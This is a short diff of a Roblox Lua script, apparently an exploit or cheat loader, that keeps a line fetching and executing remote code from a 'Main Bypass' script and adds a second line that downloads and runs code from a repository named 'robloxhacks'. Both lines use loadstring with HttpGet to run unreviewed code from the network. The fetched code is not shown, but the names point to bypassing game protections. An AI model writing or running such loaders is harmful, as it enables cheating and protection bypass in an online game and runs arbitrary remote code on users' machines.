@@ -1,6 +1,6 @@
 -- made by jerrytoaster556 for mre
 loadstring(game:HttpGet('https://raw.githubusercontent.com/Shariiii/Anomic-Stuff/main/Main%20Bypass.lua'))()
-
+loadstring(game:HttpGet('https://raw.githubusercontent.com/ALWEB2/robloxhacks/main/full'))()
 --fixed bugs
 wait(2)
 
